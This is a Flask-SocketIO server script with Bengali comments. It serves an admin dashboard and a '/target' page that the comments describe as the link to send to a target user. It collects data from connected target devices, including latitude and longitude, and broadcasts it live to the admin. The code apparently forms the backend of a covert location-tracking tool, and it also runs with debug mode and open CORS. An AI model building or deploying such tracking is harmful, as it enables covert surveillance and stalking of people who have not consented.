from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
import eventlet

# Eventlet মনকিপ্যাচ (অনেক কানেকশনের জন্য ভালো)
eventlet.monkey_patch()

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-this'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# সব কানেক্টেড ক্লায়েন্টের ডেটা সংরক্ষণের ডিকশনারি
clients = {}

@app.route('/')
def admin_dashboard():
    """অ্যাডমিন ড্যাশবোর্ড (যেখানে আপনি সব দেখবেন)"""
    return render_template('admin.html')

@app.route('/target')
def target_page():
    """যে লিংকটি আপনি টার্গেট ইউজারকে পাঠাবেন"""
    return render_template('target.html')

@socketio.on('connect')
def handle_connect():
    print(f'✅ নতুন ডিভাইস কানেক্ট হয়েছে: {request.sid}')

@socketio.on('disconnect')
def handle_disconnect():
    """ডিভাইস ডিসকানেক্ট হলে লিস্ট থেকে মুছে ফেলা"""
    if request.sid in clients:
        del clients[request.sid]
    emit('update-clients', clients, broadcast=True)
    print(f'❌ ডিভাইস ডিসকানেক্ট: {request.sid}')

@socketio.on('client-data')
def handle_client_data(data):
    """টার্গেট ডিভাইস থেকে ডেটা আসলে তা সংরক্ষণ ও সম্প্রচার"""
    # আগের ডেটার সাথে মিলিয়ে নেওয়া
    if request.sid not in clients:
        clients[request.sid] = {}
    
    clients[request.sid].update(data)
    clients[request.sid]['id'] = request.sid
    clients[request.sid]['lastSeen'] = data.get('time', '')
    
    # সব ক্লায়েন্টকে (অ্যাডমিন সহ) আপডেট পাঠানো
    emit('update-clients', clients, broadcast=True)
    print(f'📡 ডেটা আপডেট: {data.get("lat", "")}, {data.get("lng", "")}')

if __name__ == '__main__':
    # লোকাল রানের জন্য (Render-এ গুনিকর্ন ব্যবহার করবে)
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
